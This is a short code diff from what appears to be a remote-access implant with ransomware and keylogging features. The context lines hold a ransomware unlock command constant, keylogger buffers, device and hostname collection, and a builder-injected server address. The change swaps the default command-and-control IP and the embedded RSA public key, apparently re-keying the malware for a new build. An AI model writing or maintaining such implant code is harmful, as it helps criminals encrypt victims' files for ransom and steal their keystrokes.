@@ -63,7 +63,7 @@ except Exception:
 
 # ─── Configuration (Builder injects these) ────────────────────
 
-SERVER_IP = os.environ.get("SERVER_IP", "10.71.155.228")  # default to local server for testing
+SERVER_IP = os.environ.get("SERVER_IP", "10.63.69.228")  # default to local server for testing
 SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "80")))
 
 # ─── Protocol ─────────────────────────────────────────────────
@@ -98,7 +98,7 @@ CMD_RANSOM_UNLOCK = 0x25  # unlock ransomware with injected key
 
 DEVICE_ID = str(uuid.uuid4())
 HOSTNAME = socket.gethostname()
-_EMBEDDED_PUBKEY = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu+CgPp3th9K18Deq4olg\nFjXRYcWcRm4YtrogzmlLm3a8t/V+9akUKv0Wr/OaLfKupaFbESyFORPDi0J6m1+F\npv2mZYHxQB7acYg1EW+s9zuxz7fDJuQvliQqhrgtcPHuvPKbuNDijHTOE4/Z+36U\nudQVhrWpl64qRttLjFqlkhVKIyh0fok8VHfycLt3jn2Mm1Nl+bEcjXI5+JrB9btW\nZ3oyIjPb8KmtUwDaQcFdWbl2b31TnRkQCJC0rB3EMdfaTF3Bw65/kHYi8bK9xXk5\nQjCcCFcfibaFI25vpzYUuKLu9N/QemVxLZbKXpWK9AiU6mwQwLC71fZqdXKr8pxW\n9QIDAQAB\n-----END PUBLIC KEY-----"
+_EMBEDDED_PUBKEY = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuvz8i7DHUoenX1WEf0HY\n/NUofEOzfDApMHAUEUFWcZ/P5XycX+TsO4kiP0wlaThqY8It6QTFzHQ1sU3SoCsr\n4P7bgp0GPoyi6RtTTSjTu1L/fgrlkZ4hYvIGvkIzQKIuNKFPXcKv1MNZ89+uO58N\nC8JuI22etMXr7wt8EsGj1zuK+bEQQxPQ9rGAswXrvm4Y9uzLn50j16W0twDjHAMv\nfNcaTomgdKd5604bpxSICyUXJhEEQfUyr0U8M3/4JW/DTLsx9OI6O2OnXh4ccl+b\nh7B6HY5A875kexFLuUAYhm4QLztmc3JUYoyy/VcVLng1NPko3vLSSuBfQhRhHH0s\nyQIDAQAB\n-----END PUBLIC KEY-----"
 _AGENT_NAME = "english"
 _keylog_on = False
 _keybuf = ""
